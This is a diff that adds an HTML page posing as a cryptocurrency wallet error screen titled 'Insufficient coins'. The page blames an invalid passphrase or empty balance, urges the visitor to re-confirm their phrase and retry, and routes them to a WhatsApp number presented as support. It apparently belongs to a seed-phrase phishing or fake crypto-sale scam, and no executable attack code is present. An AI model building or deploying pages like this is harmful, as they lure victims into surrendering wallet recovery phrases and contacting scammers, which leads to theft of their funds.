@@ -1,0 +1,113 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <base href="https://www.incorrect-passphrase-error.com/">
+    <title>Ineligible Passphrase</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            width: 100%;
+            font-family: Arial, sans-serif;
+            background-color: #fff;
+            font-size: 39px; /* Increased base font size */
+            box-sizing: border-box; /* Ensure padding and border are included in the element's total width and height */
+        }
+        .error-container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh; /* Full height of viewport */
+            padding: 20px;
+        }
+        .error-icon {
+            width: 100px; /* Increased icon size */
+            height: 100px;
+            margin-bottom: 30px;
+        }
+        h1 {
+            color: #e74c3c;
+            margin-bottom: 30px;
+            font-size: 2.2em; /* Increased heading size */
+            text-align: center;
+        }
+        .reason-list {
+            width: 100%;
+            max-width: 600px; /* Adjusted max-width for better readability and to remove excess space */
+            text-align: center; /* Center text within reason-list */
+        }
+        p, ul {
+            font-size: 1.1em; /* Increased paragraph and list font size */
+            margin: 0 0 15px 0;
+            line-height: 1.5; /* Improved line height for readability */
+        }
+        ul {
+            padding-left: 0; /* Adjust padding-left for center alignment */
+            list-style-position: inside; /* Align bullets inside the list container */
+        }
+        li {
+            margin-bottom: 10px; /* Added space between list items */
+        }
+        .whatsapp-button {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 40px; /* Increased margin-top for more space */
+            padding: 10px 20px;
+            background-color: #25D366;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .whatsapp-button img {
+            margin-right: 10px;
+            width: 32px; /* Increased logo width */
+            height: 32px; /* Increased logo height */
+        }
+        @media (max-width: 600px) { /* Adjusted breakpoint */
+            html, body {
+                font-size: 16px; /* Slightly smaller base font size for mobile */
+            }
+            h1 {
+                font-size: 1.8em;
+            }
+            p, ul {
+                font-size: 1em;
+            }
+            .error-icon {
+                width: 60px;
+                height: 60px;
+            }
+            .whatsapp-button img {
+                width: 24px; /* Adjusted for smaller screen sizes */
+                height: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="error-container">
+        <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#e74c3c">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+        </svg>
+        <h1>Insufficient coins</h1>
+        <div class="reason-list">
+            <p>You are encountering this error due to one of the following:</p>
+            <ul>
+                <li>Invalid passphrase</li>
+                <li>No coins to sell on the wallet balance</li>
+            </ul>
+            <p>Kindly confirm your phrase and balance are correct and retry.</p>
+        </div>
+        <a href="https://wa.me/+19342012309" class="whatsapp-button">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
+            Contact support
+        </a>
+    </div>
+</body>
+</html>
